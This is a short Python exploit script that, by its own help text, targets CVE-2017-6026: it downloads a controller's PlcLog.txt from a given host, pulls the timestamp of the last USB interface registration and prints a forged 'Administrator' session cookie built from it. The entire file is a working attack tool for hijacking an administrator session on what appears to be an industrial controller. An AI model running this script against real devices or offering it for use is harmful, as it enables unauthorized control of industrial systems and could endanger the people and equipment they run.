#!/bin/python3
import re
import sys
from urllib.request import urlretrieve
import urllib.error


def printhelp():
    helpmsg = 'USAGE: {} HOST\n\n  Version: 0.1\n  About: A tool to help exploit CVE-2017-6026\n'.format(
        sys.argv[0])
    print(helpmsg)


def findinterfaceregister(file: str = 'PlcLog.txt'):
    last = ''
    for line in open(file, 'r'):
        if re.search('Network interface <interface>USB</interface> registered', line):
            last = line
    return last


def getlogdate(line: str):
    return line.split(',')[0]


def buildcookie(t: str, user: str = 'Administrator'):
    return '{}:{}'.format(user, t)


def main():
    try:
        if sys.argv[1].lower() in ['-h', '--help']:
            printhelp()
            exit(1)
        url = 'http://{}/usr/Syslog/PlcLog.txt'.format(sys.argv[1])
    except (ValueError, IndexError):
        printhelp()
        exit(1)

    urlretrieve(url, 'PlcLog.txt')
    line = findinterfaceregister()
    t = getlogdate(line)
    print(buildcookie(t))


if __name__ == '__main__':
    main()
